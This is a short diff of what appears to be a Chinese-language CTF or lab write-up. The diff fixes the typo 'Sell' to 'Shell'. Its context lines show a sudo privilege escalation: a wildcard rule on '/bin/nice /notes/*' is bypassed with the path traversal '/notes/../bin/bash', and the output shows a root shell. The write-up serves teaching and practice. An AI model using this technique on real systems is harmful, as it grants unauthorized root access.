@@ -212,7 +212,7 @@ clear.sh  id.sh
 webadmin@serv:~$ sudo /bin/nice /notes/id.sh
 uid=0(root) gid=0(root) groups=0(root)
 ```
-目標： 使用 `/bin/nice` 執行 Sell 就能拿到 root 權限
+目標： 使用 `/bin/nice` 執行 Shell 就能拿到 root 權限
 (`sudo -l` 只會驗證 `/notes/*` 參數)
 ```
 webadmin@serv:~$ sudo /bin/nice /notes/../bin/bash
